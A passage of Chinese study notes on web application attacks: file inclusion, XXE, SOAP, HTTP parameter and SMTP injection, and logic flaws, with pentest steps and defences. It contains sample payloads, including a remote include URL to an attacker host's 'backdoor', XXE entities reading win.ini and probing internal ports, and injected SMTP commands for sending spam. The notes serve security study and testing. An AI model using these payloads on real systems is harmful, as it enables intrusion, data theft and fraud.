应用程序应将路径遍历攻击和日志及警报机制融合在一起，任何时候，只要收到一个非法请求，就发出警报，终止该用户的会话，冻结该账户，并通知管理员； 文件包含漏洞有些脚本语言允许使用类似 include 的命令，来将某段代码插入到某个指定的位置，然后执行它们； 远程文件包含PHP 语言特别容易出现文件包含漏洞，因为它的包含函数接受远程文件路径，这种缺陷j是 PHP 出现了大量漏洞的根源； 1234# 应用程序接一个位置参数，然后根据该参数调用相应的 php 文件，执行其中的代码# 请求地址：https://whatever-app.com/main.php?country=US$country = $_GET[&#x27;country&#x27;];include( $country . &#x27;.php&#x27;); 由于 PHP 支持外部路径，因此攻击者可以通过传入一个远程 php 文件路径，让应用程序执行攻击想要执行的任意代码； 1# https://whatever-app.com/main.php?country=http://attacker-app.com/backdoor 本地文件包含有些应用程序根据用户的输入，加载并执行某个本地文件，则用户可以利用这个漏洞 让应用程序执行某个本应授权访问才能实现的功能； 访问服务上某些受保护的静态资源：通过将这些文件动态包含到应用程序的页面中，让执行环境将静态内容复制到响应中； 查找文件包含漏洞任何用户提交的数据项都可能产生文件包含漏洞，常常出现于由用户提交参数指定国家语言或者地理位置、由用户提交参数指定服务器的文件名； 远程文件包含的渗透测试步骤： 向每一个目标参数提交一个连接受控制的 Web 服务器资源的 URL，然后监控受控制的服务器是否受到应用程序的请求； 尝试提交一个包含不存在的 IP 地址的 URL，看应用程序是否出现请求超时，如果是，说明应用程序尝试和该 IP 地址建立连接； 如果发现应用程序可受到远程文件包含攻击，则使用相关语言可用的 API，构建一段恶意脚本实施攻击； 本地文件包含的渗透测试步骤： 提交一个请求，指向服务器上一个已知可执行资源的名称，看应用程序的行为是否出现变化； 提交一个请求，指向服务器上一个已知静态资源的名称，看文件内容是否包含在响应中； 如果应用程序可受到本地包含文件攻击，则尝试通过 Web 服务器访问任何原本无法直接访问的敏感功能或资源； 尝试能够利用遍历技巧访问其他目录中的文件； 注入 XML 解释器注入 XML 外部实体标准的 XML 解析库支持使用实体引用，目的是用来在 XML 内部或外部引用数据； 12&lt;!---内部实体在头部定义，以下定义在解析时，会将 testref 替代为指定的 testrefvalue ---&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY testref &quot;testrefvalue&quot; &gt; ]&gt; XML 还支持引用外部实体，该外部实体可用 URL 来指定，届时解析时会访问该 URL，提取其中的值，替换 XML 内部的符号； 123&lt;!---外部实体使用 SYSTEM 关键字来指定，引用时可使用 file 协议（本地文件）或者 http 协议（远程文件）；解析时，将会使用 win.ini 的内容来替代 xxe 字符串，攻击者间接获得 win.ini 的文件内容 ---&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///windows/win.ini&quot; &gt; ]&gt;&lt;Search&gt;&lt;SearchTerm&gt;&amp;xxe;&lt;/SearchTerm&gt;&lt;/Search&gt; http 协议不仅可以用来获取传统意义上的远程服务，其实也可以访问其内网或者本地的其他进程服务； 123&lt;!---获取本地局域网 192.168.1.1 的 25 端口上的邮件服务器---&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:25&quot; &gt; ]&gt;&lt;Search&gt;&lt;SearchTerm&gt;&amp;xxe;&lt;/SearchTerm&gt;&lt;/Search&gt; 通过 http 请求，可发起以下攻击： 可将应用程序变成一个代理服务器，获得该应用程序能够访问的各种敏感内容，包括其内部局域网地址中的内容； 攻击某些应用程序中可通过 URL 进行访问的漏洞； 通过遍历 IP 地址和端口号，测试后端系统哪些端口是开放的；如果该端口有开放，一般在响应时间上有差异；有时候还会在响应中包含端口服务的标题； 注入 SOAPSOAP 的全称是 simple object access protocol，指简单对象访问协议；它使用 XML 标准来封装消息，并在 Web 应用程序的不同模块之间传递这些消息；另外有些大型企业应用也使用 SOAP 在不同计算机之间传递消息，以协同完成某个任务； XML 令人蛋疼的地方在于它是一种解释型语言，有自己的语法格式，因此，可以通过它的语法，改变数据本身的意义 假设某个转账的原始请求为 FromAccount&#x3D;18281008&amp;Amount&#x3D;1000&amp;ToAccount&#x3D;08447656&amp;Submit&#x3D;Submit 在处理这个请求时，在 Web 应用程序的后端之间，使用 SOAP 封装的消息，此时请求被转换成如下格式 123456789101112&lt;soap:Envelope&gt; &lt;soap:Body&gt; &lt;pre:Add&gt; &lt;Account&gt; &lt;AccountFrom&gt;18281008&lt;/AccountFrom&gt; &lt;Amount&gt;1000&lt;/Amount&gt; &lt;ClearFunds&gt;False&lt;/ClearFunds&gt; &lt;ToAccount&gt;08447656&lt;/ToAccount&gt; &lt;/Account&gt; &lt;/pre:Add&gt; &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 由于转出账户的余额不足，因此字段 ClearFunds 的值为 False，组件之间传递这条消息的目的是记录这笔交易请求，但同时并不真正转出金额，而是标记为转账失败；攻击者可以通过在原始请求中混入符合 XML 语法的字符，来改变消息的意义； 原始请求更改为： FromAccount&#x3D;18281008&amp;Amount&#x3D;1000True1000&amp;ToAccount&#x3D;08447656&amp;Submit&#x3D;Submit 服务器在收到该请求后，如果没有对它进行净化和过滤，最终将解析成如下结果： 1234567891011121314&lt;soap:Envelope&gt; &lt;soap:Body&gt; &lt;pre:Add&gt; &lt;Account&gt; &lt;AccountFrom&gt;18281008&lt;/AccountFrom&gt; &lt;Amount&gt;1000&lt;/Amount&gt; &lt;ClearFunds&gt;True&lt;/ClearFunds&gt; &lt;Amount&gt;1000&lt;/Amount&gt; &lt;ClearFunds&gt;False&lt;/ClearFunds&gt; &lt;ToAccount&gt;08447656&lt;/ToAccount&gt; &lt;/Account&gt; &lt;/pre:Add&gt; &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 此时应用程序的某个组件在处理该消息时，由于遇到的第一个 ClearFunds 字段的值是 True，因此有可能在账户余额不足的情况下，触发转账行为； 另外还可以通过注入注释，让某些 XML 字段失效，并用攻击者自己的元素替换被注释掉的元素； 原始请求设计为： FromAccount&#x3D;18281008&amp;Amount&#x3D;1000True08447656&amp;Submit&#x3D;Submit 服务端解析结果如下： 12345678910111213&lt;soap:Envelope&gt; &lt;soap:Body&gt; &lt;pre:Add&gt; &lt;Account&gt; &lt;AccountFrom&gt;18281008&lt;/AccountFrom&gt; &lt;Amount&gt;1000&lt;/Amount&gt; &lt;ClearFunds&gt;True&lt;/ClearFunds&gt;&lt;ToAccount&gt;&lt;!-- &lt;ClearFundres&gt;False&lt;/ClearedFunds&gt; &lt;ToAccount&gt;--&gt;08447656&lt;/ToAccount&gt; &lt;/Account&gt; &lt;/pre:Add&gt; &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 请求的设计，让某部分 XML 字段被注释掉之后，仍然能够保持整体格式的合法性； 查找并利用 SOAP 注入SOAP 注入漏洞可能不容易发现，主要是任意提交注入标签，会破坏 SOAP 的消息格式，而且只是因为格式错误而返回的错误提示也非常简单，并没有什么利用价值； 渗透测试步骤 轮流在每个参数中提交一个恶意 XML 结束标签，例如 &lt;&#x2F;foo&gt;， 如果没有发生错误，说明输入要么没有插入到 SOAP 消息中，或者输入可能被净化了； 如果出现错误，再提交一对有效的起始与结束标签，例如 &lt;foo&gt;&lt;&#x2F;foo&gt;，如果错误消失了，则说明 SOAP 漏洞很可能存在； 查看提交的数据是否会在响应中返回，如果会的话，查看数据是原封不动的返回，还是以某种方式规范化了；轮流提交以下两个值，”test&lt;foo&#x2F;&gt;“ 和 “test&lt;foo&gt;&lt;&#x2F;foo&gt;“，如果返回的结果是 test，或者是另外一个值，则说明插入成功； 如果 HTTP 请求中包括多个参数，由于不知道这些参数在后端的生成顺序，因此，可以轮流在一个参数中插入注释字符串 “&lt;!–”，然后在另外一个参数中注入 “–&gt;“，看是否能够将 SOAP 消息的某个部分注释掉，从而破坏应用程序的逻辑，此时有可能造成非预期内的处理结果； SOAP 注入漏洞要能够利用成功，前提条件是知道整个 XML 的结构，这样才有办法设计专门的注入值，以便能够改变解析的结果；如果返回的错误消息不能提供这方面的信息的话，则漏洞就会很难发现；幸运的话，有可能返回的错误消息中会包含整个解析的结果，从而泄露了结构；运气不好的话，则攻击率会变得很低； 防止 SOAP 注入防止 SOAP 注入的办法是对用户的输入进行边界确认，不仅包含确认用户的当前输入，还包括用户前面步骤的输入，或者应用程序基于用户输入在过程中产生的数据； 为了防止攻击，应用程序应对用户输入中出现的任何 XML 元字符进行 HTML 编码，用 HTML 编码替代用户输入中的字面值；这样做的目的是让 XML 解析器不会将用户输入中的 XML 元字符当作有意义的语义的组成部分；几个会造成注入漏洞的 XML 元字符为： 左尖括号 &lt;，应编码为 &amp;1t 右尖括号 &gt;，应编码为 &amp;gt 斜杠 &#x2F;，应编码为 &amp;#47 注入后端 HTTP 请求应用程序经常会将用户输入弄成键值对的形式，嵌入到后端发起的 HTTP 请求中，因此攻击者可以利用这方面的漏洞将应用程序做为代理器，来访问一些本来没有权限访问的资源，例如： 服务器端 HTTP 重定向：攻击者通过注入参数到后端发起的请求中，指定应用程序请求任意的资源或 URL； HTTP 参数注入（HPI）：攻击者通过注入参数，覆盖应用程序发出的请求的指令，改变其行为逻辑和结果； 服务器端 HTTP 重定向应用程序向客户端提供的功能有时并不是由应用程序本身来完成的，而是后端有部署其他组件来提供相应的功能，因此应用程序经常需要将用户的输入，转换成相应的参数，向后端组件发起相应的请求； 示例：以下由客户端发出的请求中，loc 参数指定了要获取的 CSS 文件的地址 1view=default&amp;loc=online.wahh-blogs.net/css/wahh.css 攻击者可以通过替换 loc 参数的值，来让应用程序向其指定的地址发起资源请求，如果应用程序没有对此进行确认和过滤，则攻击者可以将地址设置为后端服务器可以访问的任意资源； 示例：攻击者将地址替换为后端的 SSH 服务 12345678# 请求，loc 参数值被替换view=default&amp;loc=192.168.0.1:22# 响应，包括了 SSH 服务的信息HTTP/1.1 200 OKConnection: closeSSH-2.0-OpenSSH_4.2Protocol mismatch. 攻击者可以利用该漏洞，让应用程序成为一个开放的代理服务器，来实施各种其他攻击 攻击者可以将该代理服务器用于攻击互联网上的第三方系统； 攻击者可以通过该服务器连接到组织内部网络中的任意主机，从而访问无法通过因特网直接访问的资源或服务； 攻击者可以利用该服务器反向连接到应用程序服务器上的其他服务，从而避开防火墙限制，并利用信任关系来避开身份验证； 攻击者可以让应用程序在响应中包括受控的内容，从而实施跨站点脚本等攻击； 渗透测试步骤 确定任何可能包含主机名、IP 地址或完整 URL 的请求参数； 对于每个参数，修改参数值，指向其他与所请求的资源类似的资源，观察该资源是否会出现在服务器的响应中； 尝试指定一个受控的 URL，然后监控在请求发出后，该 URL 是否被访问； 如果 URL 没有被连接，则观察请求的响应时间，如果时间很久，则有可能是因为某种访问规则的限制，导致应用程序的请求发不出去，导致超时； 如果能够成功发现漏洞，连接到任意的 URL，则可以尝试实施以下攻击： 确认是否可以指定端口号，例如：http://mdattacker.net:22 如果可以指定端口号，尝试使用类似 Burp Intruder 等工具对内部网络的端口进行扫描，以逐个连接到一系列 IP 地址和端口； 尝试连接到应用程序服务器回环地址上的其他服务； 尝试将受控的 Web 页面加载到应用程序的响应中，以实现跨站点脚本攻击； 有些服务器程序的重定向 API，例如 ASP.NET 中的 Server.Transfer 和 Server.Excecute，仅可重定向到同一主机上的相关URL，尽管如此，攻击者仍然可以利用信任关系，访问服务器上原本受保护的敏感资源； HTTP 参数注入示例： 123456# 客户端发起的 HTTP 请求POST /bank/48/Default.aspx HTTP/1.0Host: mdsec.netContent-Length: 65FromAccount=123&amp;Amount=1000&amp;ToAccount=456&amp;Summit=Submit 12345# 应用程序基于客户端的输入，生成新的后端 HTTP 请求POST /doTransfer.asp HTTP/1.0Host: mdsec-mgr.ini.mdsec.netContent-Lenght: 44fromacc=123&amp;Amount=1000&amp;toacc=456&amp;clearedfunds=false 由于应用程序检查后，发现账户上的余额不足，因此在发起的请求中添加了 clearedfunds&#x3D;false 键值对来避免触发实际的转账，因此，攻击有可能伪造参数来触发转账 123# 客户端发起的 HTTP 修改为# 此处故意将请求参数中的等号 = 用 %3d 来表示，连接符 &amp; 用 %26 表示，以利用应用程序将其解码为正确的符号）: FromAccount=123&amp;Amount=1000&amp;ToAccount=456%26clearedfunds%3dtrue&amp;Summit=Submit 如果应用程序没有将用户的请求进行过滤，则其向其他组件发起的请求将变成如下： 12# 应用程序未过滤用户输入时发起的请求变成如下：fromacc=123&amp;Amount=1000&amp;toacc=456&amp;clearedfunds=true 使用 HTTP 参数注入与 SOAP 注入的一个区别是，如果参数格式不对，SOAP 因为使用了 XML，会报错，从而为攻击者提供有用的反馈信息；但 HTTP 参数如果出现错误，一般不会报错，因此这会带来攻击上的困难，攻击者很难通过随机的方式猜测到参数是什么，但是如果应用程序使用的第三方组件的代码可以被查到，则攻击者可以通过查看这些代码的文档，找到其参数格式信息； HTTP 参数污染如果客户端发起的请求中，包括多个同名的键值对，HTTP 报文解析器会如何处理？不同的解析器会有不同的处理方式，常见的有以下几种： 使用第一个键值对实例； 使用最后一个实例； 将同名键值对组成数组； 不处理，串联多个参数值，添加某种分隔符； 如果应用程序使用最后一个或者第一个同名实例，都有可能让攻击者攻击成功； 攻击 URL 重写转换许多服务器程序会将受到的客户端请求的 URL 路径部分进行重写，例如处理 REST 风格的参数，定制路由函数等；如果在重写的过程中，没有进行过滤检查，则攻击者可以利用访漏洞，进行参数污染； 示例：开发者在 Apache 中配置 mod_rewrite 规则用于处理可公共访问的用户资源 12RewriteCond %&#123;THE_REQUEST&#125; ^[A-Z]&#123;3, 9&#125;\\ /pub/user/[^\\&amp;]*\\TP/RewriteRule ^pub/user/([^/\\.] +)$ /inc/user_mgr.php?mode=view&amp;name=$1 该规则提取用户请求中的文件名，做为值，与 name 字段组成参数，传递给 user_mgr.php 页面进行处理 12345# 例如接受如下请求/pub/user/marcus# 之后转换为/inc/user_mgr.php?mode=view&amp;name=marcus 攻击者可在原始请求中注入另外 mode 来改变应用程序的行为 12345# 攻击者注入额外的参数值/pub/user/marcus%26mode%30edit# Apache 服务器转换后/inc/user_mgr.php?mode=view&amp;name=marcus&amp;mode=edit 渗透测试步骤 轮流对每个请求参数进行测试，使用各种语法添加一个新注入的参数 %26foo%3dbar，URL 编码的 &amp;foo&#x3D;bar %3bfoo%3dbar，URL 编码的 ;foo&#x3D;bar %2526foo%253dbar，双重 URL 编码的 &amp;foo&#x3D;bar（将 % 百分比也做了一重编码） 确定任何修改后，不会改变应用程序行为的参数实例； 尝试在请求的不同位置注入一个已知的参数，看这样做是否会覆盖或修改现有的参数； 如果这样做会将旧值替换成新值，尝试是否可以通过注入一个由后端服务器读取的值，来避开任何前面确认机制； 用其他参数名称替换注入的已知参数（可通过解析应用程序的功能进行猜测和寻找线索）； 测试应用程序是否允许在请求中多次提交同一个参数，在参数的前后，以及请求的不同位置提交多余的值，例如查询字符串、cookie 和消息主体中； 注入电子邮件有些应用程序提供收集用户反馈的功能，例如关于产品的建议或者BUG，有些时候这类功能在后端使用电子邮件的形式来实现。即用户提交的输入，到了后端会发送给 SMTP 服务器，然后按照某种设定好的模板，发送给相关的人员；如果应用程序没有对用户的输入进行仔细净化的话，攻击者就有机会在提交的内容中，注入一些 SMTP 命令，从而控制 SMTP 服务器，实现一些非法行为，例如让 SMTP 服务器帮助攻击者发送垃圾邮件等； 操纵电子邮件头部 应用程序允许用户提交反馈的界面，用户可以在该界面中输入自己的邮件地址；之后，Web应用程序如 PHP 将调用 mail 函数，生成电子邮件，例如： 12345To: admin@wahh-app.comFrom: marcus@wahh-mail.comSubject: Site problemxxxxxxxxx 如果应用程序的后端没有对用户输入的地址进行过滤，则攻击者可以在地址中注入有效的 SMTP 命令字符串，让 SMTP 将服务发送给其指定的任意收件人 PHP mail 命令将生成如下内容 123456To: admin@wahh-app.comFrom: marcus@wahh-mail.comBcc: all@wahh-othercompany.comSubject: Site problemxxxxxxxxx SMTP 命令注入某些情况下，Web 应用程序会与 SMTP 服务器建立会话，传输数据内容； 用户端发起的请求，提交关于站点的反馈 12345POST feedback.php HTTP/1.1Host: wahh-app.comContent-Length: 56From=daf@wahh-mail.com&amp;Subject=Site+feedback&amp;Message=foo Web 应用程序与 SMTP 服务器建立的会话往来示例： 12345678MAIL FROM: daf@wahh-mail.comRCPT TO: feedback@wahh-app.comDATA # 此处 SMTP 客户端发出 DATA 命令，应用程序接下来将开始发送消息的内容，包括消息头和消息体，并以点号表示结束From: daf@wahh-mail.comTo: feedback@wahh-app.comSubject: Site feedbackfoo. # 用单独一行的点等号表示消息的结束 如果应用程序没有对用户输入进行过滤的话，则攻击者可以利用这个漏洞，在消息中注入有效的 SMTP 命令，从而实现对 SMTP 服务器的控制；注入示例如下（在 subject 字段进行注入）： 之后 Web 应用程序建立如下 SMTP 会话，生成了两个电子邮件，其中第二段由攻击者完全控制： 123456789101112131415161718MAIL FROM: daf@wahh-mail.comRCPT TO: feedback@wahh-app.comDATA From: daf@wahh-mail.comTo: feedback@wahh-app.comSubject: Site feedbackfoo.MAIL FROM: mail@wahh-viagra.comRCPT TO: john@wahh-mail.comDATAFrom: mail@wahh-viagra.comTo: john@wahh-mail.comSubject: Cheap V1AGR4Blah.foo. 查找 SMTP 漏洞在解析应用程序的功能时，留意其中那些与电子邮件相关的功能，测试这些功能涉及的每一个参数，甚至那些可能与生成的消息无关的参数； 除了每一种攻击方式外，还注意各使用 Windows 和 Unix 的换行符来测试一遍，因为有时候并不知道后台使用的是哪一种操作系统； 渗透测试步骤 轮流提交以下的测试字符串作为每一个参数，用于在相关位置插入电子邮件地址； 留意应用程序返回的错误消息，根据错误消息，看是否跟电子邮件功能相关，如果是的话，考虑对提交的注入内容进行相应的调整，以利用漏洞； 监控受控的邮箱，看是否收到邮件； 仔细检查发出的 HTTP 请求，看是否存在与后端的电子邮件相关的线索，例如是否包含隐藏或禁用字段，用于指定电子邮件收件人等； 发送电子邮件功能经常被视为外围功能，而非核心功能，因此经常没有被重视，并采取足够的安全保障；电子邮件有时需要调用一些不常用的第三方组件，应用程序经常直接调用操作系统的命令来执行它们，因此还经常隐藏着 OS 命令的注入漏洞，应对其进行仔细的检查； 防止 SMTP 注入防止 SMTP 注入的办法用户提交的任何数据进行严格的检查 根据一个适当的正则表达式检查电子邮件地址，例如拒绝所有的换行符； 消息主题不得包含任何的换行符，并应实施适当的长度限制； 如果消息内容会被 SMTP 会话直接使用，则应在消息内容中禁止使用只有一个点字符的消息行； 小结一般来说，实施有效攻击的关键在于从直觉上了解漏洞的位置，以及如何对其加以利用；获得这种直觉的方式在于实践，在现实的应用程序中，演练前面提到的各种攻击技巧，并观察应用程序如何对攻击作出反应，从而建立对应用程序行为与漏洞有关联的直觉。 11. 攻击应用程序逻辑计算机不外乎做两种计算，一种是逻辑计算，一种是算术计算；所有复杂的应用程序功能，最后都将拆解成由简单的逻辑和算术计算来构成；人们常常只关注那些常见的漏洞，例如 SQL 注入或者跨站点脚本，却往往忽略了程序中的逻辑漏洞其实它们无处不在，尤其是当应用程序是由多名水平参差不齐的开发者来共同完成的时候；这些漏洞经常是与应用程序功能紧密相关和唯一的，它们很隐蔽，无法被常规的漏洞扫描器所发现； 逻辑缺陷的本质逻辑缺陷本质上来源于开发者的设计缺陷，由于开发者在设计过程，做出某种错误的假设，导致应用程序在某些条件下，将出现预期外的行为；只要开发者的水平没有显著提高，这些漏洞缺陷将是不可避免和大量存在的。 现实中的逻辑缺陷例子1：加密算法提示漏洞有些应用程序为了减少用户登录的次数，会将用户信息加密成一个长久有效的 cookie 值，存储在浏览器中；正常情况下，攻击者是无法破解该加密后的 cookie 值的，但是有些开发者还会将该加密算法应用于其他 cookie 字段，例如屏幕上显示的用户昵称；但好死不死的是，用户昵称是可以由用户自己指定的；因此，攻击者通过指定不同的用户昵称，就可以得到加密后的值；此时，攻击者可以将自己浏览器上加密后的 cookie 值做为昵称，经过加密算法解密后，得出原始值的格式；然后再按照相同的格式，尝试将其中的用户名替换为管理员的用户名，然后设置为昵称，这样就可以得到加密后的新 cookie 值；使用该 cookie 值，很可能就可以实现管理员登录； 渗透测试步骤漏洞场景：使用令牌的程序 在应用程序中找出使用加密值的位置（大多数情况下是使用散列值）； 查找应用程序中，任何对用户提交的值进行加密或者解密的位置； 如发现应用程序使用某个加密值，尝试替代该加密值，然后观察程序是否会提示替代后的结果或报错； 如有结果或报销，尝试利用该信息； 查找应用程序中，当用户提交加密值，程序会在响应中显示对应的解密值的位置 如有，说明提示漏洞存在； 确认这种漏洞是否会导致敏感令牌泄露； 查找应用程序中，当用户提交明文值，程序会在响应中显示对应的加密值的位置； 如有，说明提示漏洞可能存在； 尝试对该漏洞加以利用，例如通过指定任意值，让程序进行处理，得到有用的信息； 例子2：密码修改漏洞有些程序为用户提供修改密码的功能，该功能要求客户端提交用户名、现有密码、新密码等字段组成；同时，该功能同时也面向管理员，即管理员也可以使用该功能修改自己的密码；两种角色的区别在于管理员不需要提供现有密码，后端的代码通过判断是否包含现有密码，来区别修改密码的用户是否为管理员角色； 这个漏洞的脑洞太大了，简直是致命的；攻击者可以利用该漏洞获得管理员的权限，并修改任意用户的现有密码； 渗透测试步骤 在探查逻辑缺陷时，尝试轮流删除关键功能的请求中提交的每一个参数，例如 cookie、查询字符串、POST 参数等； 删除参数名称的时候，同时也删除参数值，而不是将参数值设置为空字符串； 一次仅攻击一个参数，确保可以覆盖后端代码逻辑中的每一个分支； 如果该功能属于多阶段过程，务必要完成整个过程，因为很可能后面步骤会使用前面步骤中提交的并保存在会话中的数据； 例子3：步骤控制漏洞在多步骤的功能中，很多开发者想当然的认为用户一定会按照界面上显示的内容，依次完成每一个环节，但事实上攻击者并不会这么做；攻击者会以任意顺序提交请求，从而绕过一些中间步骤，达到最终结果； 渗透测试步骤 如果某个多阶段功能需要按预定顺序提交一系列请求，尝试按其他顺序提交请求； 尝试完全忽略某些中间阶段； 多次访问同一个阶段； 推后访问前一个阶段； 了解多阶段功能的阶段控制办法； 例如多阶段功能的不同阶段的请求，可能都是访问的同一个 URL，并在参数中指定阶段序号参数或者阶段名称； 猜测开发者做出的错误假设，判断主要受攻击面的点； 设法找出如何违反这些假设的方法，从而让程序出现反常行为； 在不按顺序访问程序时，如果程序出现异常行为，例如某个变量值和状态值异常；则此时很可能存在可以利用的有用错误信息，可用来进一步推断程序的内部机制，以便对攻击方法进行优化； 例子4：额外字段漏洞开发者经常假设用户只会提交页面表单所指定的字段，但事实上攻击者可以提交额外的字段，来影响程序的行为； 因此，绝对不能读取客户端提交的整个请求对象，而是按需读取；如果需要读取很多字段，可以编写一个函数进行净化处理，返回一个按需读取后生成的新对象； 在多阶段的功能中，开发者经常在后面阶段中假设其收到的值，已经在前面的阶段中经过了严格的检查，但事实上，由于攻击可以直接访问任意一个阶段，这将导致后面阶段收到的值，其实是攻击者自行定义好的，根本没有经过前面阶段的代码的任何检查； 渗透测试步骤 如果存在多阶段的功能，则应提取某个阶段提交的参数，然后尝试在另外一阶段提交该参数； 如果程序的状态随参数的变化出现更新，则应进一步探索这种漏洞的衍生效果，看是否可以利用它来实施恶意的操作； 某个功能可能使用不同的参数来区分用户，来产生不同的行为；观察不同角色的用户，就同一项功能，是否在提交的参数上有什么不同； 如果有，就尝试以 B 用户的身份提交 A 用户的独有参数，观察该请求的衍生效果，猜测是否存在可利用的漏洞； 例子5：会话身份漏洞开发者经常将用户信息保存在会话中，如果程序中存在某个功能（例如注册），允许更改会话中用户的的核心信息，则有可能存在伪造身份的漏洞，即攻击者先注册一个有效的会话，然后利用该功能，更改其会话中的身份信息，并跳转到程序中的其他页面，此时很可能能够扮演其他身份的用户； 渗透测试步骤 如果应用程序存在水平权限或垂直权限隔离，则设法确定会话中存储了哪些与用户身份相关的信息； 浏览某个功能区域，然后转换到另一个完全无关的区域，检查积聚的状态，是否会对应用程序的行为造成影响； 例子6：交易限额漏洞假设某个程序有权在两个受控的账户之间进行转账（例如银行账户），并设置转账限额，超过限额后需要审批；限额判断的代码容易犯一个错误，即忘记处理输入值为负数的情况，此时有可能导致反向转账成功； 渗透测试步骤规避交易限制的第一步，是先确认当前的输入控制接受哪些字符，不接受哪些字符 试着输入负值，观察程序是否能够正常处理； 如果能够正常处理，此时有可能需要为利用漏洞创造条件，例如确保转出账户上有足够的金额；（想起了虚拟平台被攻击的案例）； 例子7：折扣计算漏洞很多电商程序会提供折扣计算功能，即购物金额超过一定金额时，消费者能够享受到更大的折扣；开发者有时会忘记处理逆向场景，即当消费者将商品从购物车移走时，需要重新计算折扣，导致消费者可以利用这个漏洞，先添加在大量商品，触发折扣条件，然后再移除不需要的商品； 渗透测试步骤 检查应用程序中，是否存在价格或其他敏感价值的东西，需要根据用户输入的数据进行调整的情况； 如果有，了解程序使用的算法和调整的逻辑； 检查这些调整是一次性的行为，还是非一次性行为； 发挥想象力，想出一种操纵办法，让调整行为与开发者的预设相矛盾； 例子8：转义符漏洞为了避免注入漏洞，开发者会对敏感字符进行限制，但是开发者经常只控制一层（没有递归），导致攻击者可能会使用两层甚至多层转义的办法，来绕过开发者的限制； 例如：开发者会设置敏感字符列表，然后对列表中的字符添加转义符；当用户提交 foo;ls 时，开发者会对其中的敏感字符分号添加转义符，最终变成 foo;ls 但是，攻击者会尝试提交 foo;ls，这样一来，按照开发者的处理逻辑，最终字符串变成了 “foo\\;ls”，转义符本身被转义，shelll 可以接受以上命令并执行，攻击者的注入意图得以实现； 渗透测试步骤在探查程序是否存在注入缺陷时，尝试在受控制的数据中，插入相关元字符后，再在每个元字符前插入一个反斜线，对元字符符进行转义，观察程序程序的反应； 一些处理跨站点脚本攻击的代码中，也经常使用转义符来净化用户提交的数据，但是它们经常忘了对转义符本身进行处理； 例子9：过滤截短漏洞开发者在防范 SQL 注入漏洞时，会使用过滤和长度限制两种方法；一种常见的过滤方法是对引号进行配对，这样就可以避免攻击者使用引号；在做长度限制时，有些开发者不是直接报错，而是对输入进行截短；攻击者此时可以巧妙的利用截短功能，来使用引号配对功能失效，从而能够实施注入攻击； 一开始并不需要知道开发者实施的长度限制是多少，攻击者只需要轮流提交奇数个和偶数个由引号组成的长字符串，并观察程序是否报错，即可确认长度限制为多少； 渗透测试步骤记下应用程序中修改用户输入的所有位置（例如截短、删除数据、编码、解码等）；对于观察到每一个位置，检查是否可以人为构造恶意字符串； 如果输入数据已经被过滤了一次（非递归），确认是否可以提交一个“补偿”过滤的字符串；例如：假设程序会过滤着关键字 SELECT，则尝试提交 SELECTSELECT，看程序是否会在过滤后，留下一个 SELECT； 如果程序中存在多步骤的行为，则可以检查是否可以利用后面的步骤，来破坏上一个步骤的过滤结果； 例子10：搜索功能漏洞有些应用程序提供全局搜索功能，即搜索所有文档，但有时这些文档只是部分公开，攻击者可以利用搜索功能，反复提交各种关键字组合，从而推断出文档的内容，获取一些敏感数据； 例子11：调试信息漏洞当一个新产品上线时，前期不可避免会存在大量功能上的缺陷，开发者为了方便调试，经常会让程序返回一些与错误相关的数据，有时候这些数据是很敏感的，例如用户的令牌、用户名、请求参数等；开发者有时会将这些数据保存在某个全局变量，然后使用某个 URL 指向它，然后通过重定向返回错误提示数据； 如果访问错误提示数据的 URL 是固定的或者可以预测的，那些攻击者可以通过反复访问该 URL，来获取一段时间内所有的错误提示，从而获取到一大堆用户敏感数据，甚至当管理员访问出错时，就可以直接得到管理员的敏感数据，从而攻陷整个程序； 渗透测试步骤 先罗列出程序中所有可能出现的反常事件和条件（以便创造条件触发它们），以及使用非常规的方式返回有用的用户令牌的情况（例如返回调试信息）； 同时使用两名用户的账户登录并使用应用程序，使用一名用户系统性的触发每个条件，观察另外一个用户是否会受到影响； 例子12：全局变量漏洞经验不足的开发者有时会将某个用户信息保存在全局变量中，以供另外一个位置的函数能否进行访问；当用户数量足够多时，有可能同时有两名用户触发保存该变量的条件，此时会形成竞态条件，从而使得一名用户有机会访问另外一名用户的信息； 渗透测试步骤这种漏洞很难发现，因为它需要比较极端的条件，同时错误不容易复现 针对关键功能进行测试，例如登录机制，密码修改功能、转账功能等； 该关键功能要求用户提交一个或多个请求； 找出确认用户请求提交成功的判断方法，即用户请求的数据，能够被查看核对； 使用多台机器，从不同的网络位置发起请求，反复执行请求操作，检查每项操作是否达到预期的结果； 由于程序将面临高负载访问，做好接收错误警报的准备； 避免逻辑缺陷由于逻辑缺陷是由于开发者在功能设计中考虑不周造成的，因此它出现的形式多种多样，并没有什么统一的规律；但仍然存在一些最佳实践能够尽量减少漏洞出现的概率； 确保将应用程序的设计信息尽量清楚详细的记录在文档中，以方便其他人了解设计者在设计过程中做出的相关假设，从而不同人可以站在不同的视角，来判断其他假设是否隐藏潜在的漏洞； 要求所有的源代码提供清楚的注释，包括： 每个代码组件的用途和使用方法； 每个组件对其接收的内容的假设； 进行代码的安全审查时，思考开发者的假设，是否任何被违背的可能性，尤其是当输入是能否被用户完全控制的时候； 进行代码的安全审查时，思考两个问题：程序如何处理用户的异常行为和输入；功能依赖的不同组件之间是否可能造成相互影响； 铭记以下内容： 用户可以控制请求的所有内容； 仅根据会话确定用户的身份与权限；不根据请求中的内容对用户的权限做出任何假设； 当根据用户的请求，对会话数据进行操作时，考虑可能给程序功能造成什么影响；很多时候影响是跨开发者的，即影响了其他程序员开发的功能； 如果某个搜索功能能否访问用户本应无法访问的敏感信息，则应该确保用户无法使用该功能，或者无法根据搜索结果提取有用的信息，或者根据当前用户的信息执行动态的搜索； 在双重授权模型中，考虑一个高级权限用户，创建另外一个相同权限用户的可能影响； 小结探查逻辑缺陷的关键点，在于洞查开发者的思维方式，他们会如何完成某个功能，会走哪些捷径，会做出哪种错误的假设，通常会犯下什么错误、当开发时间紧张时会漏考虑什么问题等； 12. 攻击其他用户XSS 的分类反射型 XSS 漏洞提取用户提交的输入，并将其插入到服务器响应的 HTML 代码中，是 XSS 